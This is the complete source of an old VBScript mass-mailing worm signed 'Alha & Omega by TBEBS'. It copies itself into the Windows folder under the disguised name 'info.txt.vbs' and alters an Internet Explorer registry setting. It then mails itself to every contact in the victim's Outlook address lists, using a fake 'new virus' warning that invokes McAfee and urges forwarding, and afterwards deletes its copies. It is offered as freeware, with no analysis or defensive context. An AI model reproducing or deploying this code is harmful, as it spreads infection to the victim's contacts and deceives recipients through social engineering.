rem Alha & Omega by TBEBS
rem the folowing code is freeware
Set fso = CreateObject("Scripting.FileSystemObject")
Set dirwin = fso.GetSpecialFolder(0)
Set c = fso.GetFile(WScript.ScriptFullName)
dim name,reg			
name = dirwin+"\info.txt.vbs"
c.copy(name)
set reg=CreateObject("WScript.Shell")
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Window Title","I am the Alpha and Omega"
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "New virus discovered!"
male.Body = vbcrlf&"A new virus has been discovered! It's name is @-@Alha and Omega@-@."&vbcrlf& _
"Full list of virus abilities is included in attached file @-@info.txt@-@."&vbcrlf& _
"For the last information go to McAfee's web page"&vbcrlf& _
""&vbcrlf& _
"Please forward this mesage to everyone you care about."
male.Attachments.Add(name)
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
fso.DeleteFile(name)
fso.DeleteFile(WScript.ScriptFullName)